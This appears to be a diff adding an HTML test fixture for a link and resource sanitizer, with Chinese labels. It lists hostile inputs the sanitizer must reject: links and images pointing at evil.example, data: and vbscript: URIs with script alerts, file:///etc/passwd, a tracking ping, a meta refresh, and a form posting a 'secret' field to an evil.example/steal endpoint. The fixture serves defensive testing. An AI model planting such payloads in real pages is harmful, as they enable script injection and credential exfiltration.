@@ -1,0 +1,42 @@
+<h2>危险地址与外部请求样例</h2>
+<p>被拒绝的链接不能导航,清理结果也不能向任何外部地址发起请求。</p>
+
+<h3>外站链接与协议混淆</h3>
+<ul>
+  <li><a href="https://evil.example/phish">外站 HTTPS 链接(策略拒绝)</a></li>
+  <li><a href="http://evil.example/x">外站 HTTP 链接</a></li>
+  <li><a href="//evil.example/protocol-relative">协议相对地址 //</a></li>
+  <li><a href="/local/path">根相对路径</a></li>
+  <li><a href="../relative">相对路径</a></li>
+  <li><a href="\\evil.example\path">反斜杠伪装</a></li>
+  <li><a href="https:&#47;&#47;evil.example&#47;x">实体编码的外站地址</a></li>
+</ul>
+
+<h3>非白名单协议</h3>
+<ul>
+  <li><a href="data:text/html,<script>alert(1)</script>">data: HTML 文档</a></li>
+  <li><a href="blob:https://evil.example/uuid">blob: 地址</a></li>
+  <li><a href="filesystem:https://evil.example/temp/f">filesystem: 地址</a></li>
+  <li><a href="vbscript:msgbox(1)">vbscript: 协议</a></li>
+  <li><a href="mailto:attacker@example.test">mailto: 协议(拒绝,防拉起外部程序)</a></li>
+  <li><a href="tel:10086">tel: 协议</a></li>
+  <li><a href="file:///etc/passwd">file: 本地文件</a></li>
+</ul>
+
+<h3>外部资源</h3>
+<img src="https://tracker.example/beacon.gif" alt="外站图片(应被拦截)">
+<img src="http://evil.example/1x1.gif" alt="HTTP 外站图片">
+<img src="//cdn.example/x.png" alt="协议相对图片">
+<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+" alt="SVG data 图片(可带脚本,拒绝)">
+<img src="data:text/plain;base64,aGVsbG8=" alt="非图片 data URI">
+<video poster="https://evil.example/poster.jpg"></video>
+<link rel="stylesheet" href="https://evil.example/x.css">
+<meta http-equiv="refresh" content="0;url=https://evil.example">
+<base href="https://evil.example/">
+
+<h3>新窗口/弹窗与表单</h3>
+<a href="#ok" target="_blank" ping="https://tracker.example/ping">target 与 ping 跟踪</a>
+<form action="https://evil.example/steal" method="post">
+  <input name="secret" value="凭据外发">
+  <button type="submit">提交到外站</button>
+</form>
